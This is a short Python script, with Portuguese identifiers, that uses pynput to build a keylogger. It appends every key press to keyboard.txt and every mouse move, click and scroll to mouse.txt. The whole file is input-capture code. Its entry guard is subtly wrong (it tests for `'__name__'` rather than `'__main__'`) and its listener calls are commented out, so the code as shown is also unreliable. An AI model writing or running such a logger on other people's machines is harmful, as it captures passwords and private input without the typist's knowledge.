from pynput import keyboard
from pynput import mouse


class Keyboard_listener():
    def __init__(self):
        self.nome_arquivo = "keyboard.txt"
        
    def escreve_keylog(self,key):
        with open(self.nome_arquivo,"a") as data:
            data.write(f"{str(key)}\n".replace("Key.",""))

    def liga_keylistener(self):
        with keyboard.Listener(on_press=self.escreve_keylog) as log:
            log.join()

class Mouse_listener():
    def __init__(self):
        self.arquivo_nome = "mouse.txt"

    def on_move(self,x,y):
        with open(self.arquivo_nome,"a") as move:
            move.write(f"MouseMV ({x},{y})\n")
        print(f"Mouse movido para ({x},{y})")

    def on_click(self,x,y,button,pressed):
        with open(self.arquivo_nome,"a") as click:
            click.write(f"{button} {'pressed' if pressed else 'relesed'} ({x},{y}) \n")
        print(f"{button} {'pressed' if pressed else 'relesed'} ({x},{y}) ")

    def on_scroll(self,x,y,dx,dy):
        with open(self.arquivo_nome,"a") as scroll:
            scroll.write(f"scroll ({x},{y}) {'down' if dy < 0 else 'up'}\n")
        print(f"scroll ({x},{y}) {'down' if dy < 0 else 'up'}")

    def listen(self):
        with mouse.Listener(on_click=self.on_click,on_move=self.on_move,on_scroll=self.on_scroll) as listener:
            listener.join()

if __name__ == "__name__":
    kkey = Keyboard_listener()
    mo = Mouse_listener()
    #mo.listen()
    #kkey.liga_keylistener()
